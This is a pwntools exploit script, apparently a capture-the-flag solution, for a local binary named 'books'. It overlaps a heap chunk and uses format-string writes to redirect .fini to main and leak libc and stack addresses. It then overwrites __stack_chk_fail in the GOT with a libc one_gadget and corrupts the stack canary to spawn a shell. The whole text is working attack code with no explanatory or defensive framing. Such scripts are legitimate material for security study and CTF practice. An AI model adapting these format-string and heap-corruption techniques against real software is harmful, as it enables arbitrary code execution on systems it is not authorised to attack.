#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'

def action(msg):
    p.sendlineafter(b'5: Submit', msg)

def edit(msg):
    p.sendline(msg)

p = process('./books')
elf = ELF('./books')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

fini_addr = 0x6011b8
payload = b'1' * 8
payload += p64(fini_addr)     # %13$hhn
payload += p64(fini_addr + 1) # %14$hhn
action(payload)

# extend order 2
fmt = b'%10x%14$hhn%47x%13$hhn|%31$p|%17$p|'
len1 = 9
len2 = 10
payload = b'A' * (0x10 - len1)
payload += fmt.ljust(0x70 - len2, b'A')
payload = payload.ljust(0x80, b'\0')
payload += p64(0) + p64(0x1541) # attach to top chunk
edit(payload)

# free order 2
action(b'4')

# malloc(0x140)
# fmt attack, overwrite fini_addr to main
action(b'5')

for i in range(7):
    p.recvuntil(b'|')

libc.address = int(p.recvuntil(b'|', drop=True), 16) - 0x20830
log.info('libc address: {:#x}'.format(libc.address))

stack = int(p.recvuntil(b'|', drop=True), 16) - 0x20830
log.info('stack address: {:#x}'.format(stack))

payload = b'1' * 8
payload += p64(elf.got['__stack_chk_fail'])     # %13$hhn
payload += p64(elf.got['__stack_chk_fail'] + 1) # %14$hhn
payload += p64(elf.got['__stack_chk_fail'] + 2) # %15$hhn
payload += p64(elf.got['__stack_chk_fail'] + 3) # %16$hhn
payload += p64(elf.got['__stack_chk_fail'] + 4) # %17$hhn
payload += p64(elf.got['__stack_chk_fail'] + 5) # %18$hhn
payload += p64(stack + 0x20620)                 # %19$hhn
action(payload)

# extend order 2
one_gadget = 0x45216
objList = []
for i in range(6):
    v = ((libc.address + one_gadget) >> (8 * i)) & 0xff
    objList.append({'idx': 13 + i, 'val': v})
objList = sorted(objList, key=lambda x: x['val'])
for i in range(len(objList) - 1, 0, -1):
    objList[i]['val'] = objList[i]['val'] - objList[i - 1]['val']
fmt = b''
for i in range(len(objList)):
    fmt += b'%' + str(objList[i]['val']).encode() + b'x'
    fmt += b'%' + str(objList[i]['idx']).encode() + b'$hhn'
fmt += b'%19$hn'
log.info('fmt : {}'.format(fmt))

len1 = 9
len2 = 10
payload = b'A' * (0x10 - len1)
payload += fmt.ljust(0x70 - len2, b'A')
payload = payload.ljust(0x80, b'\0')
payload += p64(0) + p64(0x351)
edit(payload)

# free order 2
action(b'4')

# malloc(0x140)
# fmt attack, overwrite __stack_chk_fail@got to one-gadget
# and arbitrary edit canary
action(b'5')

p.interactive()

